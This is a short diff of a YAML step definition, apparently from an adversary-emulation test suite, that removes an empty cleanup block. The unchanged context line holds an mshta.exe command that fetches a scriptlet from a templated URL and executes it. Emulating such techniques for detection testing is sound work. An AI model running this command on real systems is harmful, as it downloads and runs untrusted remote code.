@@ -22,6 +22,3 @@ steps:
       inline: |
         mshta.exe javascript:a=(GetObject('script:{{.Args.file_url}}')).Exec();close();
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
